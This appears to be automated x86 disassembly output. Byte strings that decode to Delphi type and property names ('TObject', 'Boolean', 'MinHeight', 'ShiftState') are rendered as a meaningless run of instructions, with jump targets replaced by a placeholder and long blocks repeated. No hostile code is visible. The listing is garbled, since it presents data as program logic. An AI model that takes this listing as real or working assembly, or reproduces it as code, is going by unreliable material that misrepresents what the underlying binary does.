jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
jo r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
sbb bl bh
inc edx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add al bl
std
inc edx
add [ eax ] al
adc [ eax ] al
nop
sbb [ ebx + eax * 2 ] al
add [ eax ] cl
or al 0x54
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4306e4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43065cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
test [ ebx + eax * 2 ] al
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc ebx
add [ edx + edx ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
in al 0x6
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x66004308 ] ah
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
mov esp 0x9000435e
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
push 0x9c00433c
imul eax [ ebx ] 0xffffff94
pop edi
add [ eax ] al
shl [ edx ] 0x41
push eax
outsd
jo r-xdata
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
pop eax
pop es
inc ebx
add [ eax ] cl
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ebx
shl ah 0x6
inc ecx
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
int3
add [ esp + 0x41 ] cl
jo r-xdata
add al al
and al [ ecx ]
dec esp
movsb [ edi ] [ esi ]
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
or al [ ebx ]
pop esp
add [ eax ] eax
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x7fc0040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
jo r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004308 ] cl
or al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x66004308 ] al
lea eax [ eax ]
cld
pop es
jbe r-xdata
add [ esi + 0xa ] ah
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
jo r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc ebx
add [ eax + eax * 2 ] ch
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add ah cl
inc ebx
add [ eax + 0x48 ] bh
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x2c00433b ] dl
pop edx
inc ebx
add [ eax ] ch
pop edx
inc ebx
add al bh
pop edx
inc ebx
add ah dl
cmp eax 0x45180043
inc ebx
add [ esp + eax * 2 + 0x43 ] bh
add [ ebp + ecx * 2 + 0x3d1c0043 ] ah
inc ebx
add [ eax ] ah
cmp eax 0x6d340043
inc ebx
add [ eax + 0x6d ] ah
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax ] ch
pop ebp
inc ebx
add ah ah
insd
inc ebx
add [ edi + ecx * 2 + 0x43 ] ah
add al bl
dec edi
inc ebx
add [ eax + eax * 2 + 0x43 ] cl
add [ eax + 0xe00434f ] bh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax + 0x3c ] ch
inc ebx
add [ ebx + ebp * 2 + 0x5f940043 ] bl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_42ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc [ edx ]
and [ eax ] al
add [ eax ] al
mov [ esi ] dl
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add [ eax + 0x41 ] al
add ah ch
inc ebx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add al al
aaa
inc ebx
add [ eax + 0x10004336 ] dh
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 + 0x42 ] bl
add [ eax ] ah
add [ eax ] al
add [ eax + 0x28004116 ] cl
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc [ edx ]
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
inc edx
add [ edi ] al
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
adc [ eax ] al
add bh bh
xor al 0x37
inc [ edx ]
inc [ edx ]
adc al 0x0
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x4300a8c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
fdiv st6
inc edx
add [ eax ] dl
add [ eax ] al
push [ edi + esi ]
add bh bh
xor al 0x37
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
xor [ eax ] al
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x42fedc74
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
imul ebp [ esi + 0x74 ] 0x42ff4873
add ah bh
push ss
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
inc edx
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push [ edi + esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add ah bl
inc [ edx ]
or [ eax ] al
add bh bh
xor al 0x37
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push 0x70004010
cmovno eax [ eax ]
nop
pop eax
add [ ebx ] eax
or [ esi ] cl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x42fedc74
imul esp [ gs : edi + 0x68 ] 0x42fedc74
add [ eax + eax ] cl
add bh bh
xor al 0x37
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add al bl
std
inc edx
add [ eax ] al
adc [ eax ] al
nop
sbb al 0x2
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
outsb
je r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
hlt
add [ eax - 0x8 ] bh
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x1940040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x27c0040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
je r-xdata
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
hlt
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] ah
add eax [ ebx ]
or [ esi ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
js r-xdata
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc edx
add ah al
add al [ ebx ]
or [ 0x646e4554 ] cl
inc esp
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ ebx + 0x43055cc0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop esp
add eax 0xf080043
push esp
inc ebx
popad
jo r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
sbb bl bh
inc edx
add al dl
add al 0x43
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
jo r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
sbb bl bh
inc edx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add al bl
std
inc edx
add [ eax ] al
adc [ eax ] al
nop
sbb [ ebx + eax * 2 ] al
add [ eax ] cl
or al 0x54
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4306e4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43065cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
test [ ebx + eax * 2 ] al
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc ebx
add [ edx + edx ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
in al 0x6
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x66004308 ] ah
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
mov esp 0x9000435e
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
push 0x9c00433c
imul eax [ ebx ] 0xffffff94
pop edi
add [ eax ] al
shl [ edx ] 0x41
push eax
outsd
jo r-xdata
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
pop eax
pop es
inc ebx
add [ eax ] cl
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ebx
shl ah 0x6
inc ecx
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
int3
add [ esp + 0x41 ] cl
jo r-xdata
add al al
and al [ ecx ]
dec esp
movsb [ edi ] [ esi ]
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
or al [ ebx ]
pop esp
add [ eax ] eax
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x7fc0040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
jo r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004308 ] cl
or al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x66004308 ] al
lea eax [ eax ]
cld
pop es
jbe r-xdata
add [ esi + 0xa ] ah
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
jo r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc ebx
add [ eax + eax * 2 ] ch
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add ah cl
inc ebx
add [ eax + 0x48 ] bh
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x2c00433b ] dl
pop edx
inc ebx
add [ eax ] ch
pop edx
inc ebx
add al bh
pop edx
inc ebx
add ah dl
cmp eax 0x45180043
inc ebx
add [ esp + eax * 2 + 0x43 ] bh
add [ ebp + ecx * 2 + 0x3d1c0043 ] ah
inc ebx
